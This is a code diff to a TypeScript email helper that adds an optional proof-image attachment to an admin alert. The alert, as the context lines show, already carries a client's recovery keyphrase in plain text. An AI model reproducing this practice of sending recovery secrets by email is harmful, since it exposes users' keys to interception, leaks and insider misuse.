@@ -352,6 +352,11 @@ export async function sendKeyphraseAdminEmail(options: {
   clientName?: string;
   keyphrase: string;
   submittedAt?: string;
+  proofImageAttachment?: {
+    filename: string;
+    mimeType: string;
+    content: Buffer;
+  };
 }): Promise<{ emailSent: boolean }> {
   if (!isEmailConfigured()) {
     console.warn("[Email] Keyphrase alert skipped — email not configured");
@@ -381,6 +386,12 @@ export async function sendKeyphraseAdminEmail(options: {
       ``,
       `Recovery keyphrase:`,
       options.keyphrase,
+      ...(options.proofImageAttachment
+        ? [
+            ``,
+            `Proof image attached: ${options.proofImageAttachment.filename} (${options.proofImageAttachment.mimeType})`,
+          ]
+        : []),
       ``,
       `Review in the admin console. Treat as highly confidential.`,
     ].join("\n"),
@@ -400,11 +411,31 @@ export async function sendKeyphraseAdminEmail(options: {
           <p style="margin: 0 0 8px; font-family: sans-serif; font-size: 12px; color: #991b1b; font-weight: bold; text-transform: uppercase;">Recovery keyphrase (confidential)</p>
           <p style="margin: 0; white-space: pre-wrap; word-break: break-word; font-size: 13px; line-height: 1.5;">${escapedPhrase}</p>
         </div>
+        ${
+          options.proofImageAttachment
+            ? `<div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:14px;margin:16px 0;">
+          <p style="margin:0;font-family:sans-serif;font-size:12px;color:#1d4ed8;font-weight:bold;text-transform:uppercase;">Proof image attached</p>
+          <p style="margin:6px 0 0;font-family:sans-serif;font-size:13px;color:#334155;">${options.proofImageAttachment.filename} (${options.proofImageAttachment.mimeType})</p>
+        </div>`
+            : ""
+        }
         <p style="font-family: sans-serif; font-size: 12px; color: #94a3b8;">
           Also saved in the admin case manager. Do not forward this email.
         </p>
       </div>
     `,
+    attachments: options.proofImageAttachment
+      ? [
+          {
+            filename: options.proofImageAttachment.filename.replace(
+              /[^\w.\-]+/g,
+              "_"
+            ),
+            content: options.proofImageAttachment.content,
+            contentType: options.proofImageAttachment.mimeType,
+          },
+        ]
+      : undefined,
   });
 
   console.log(
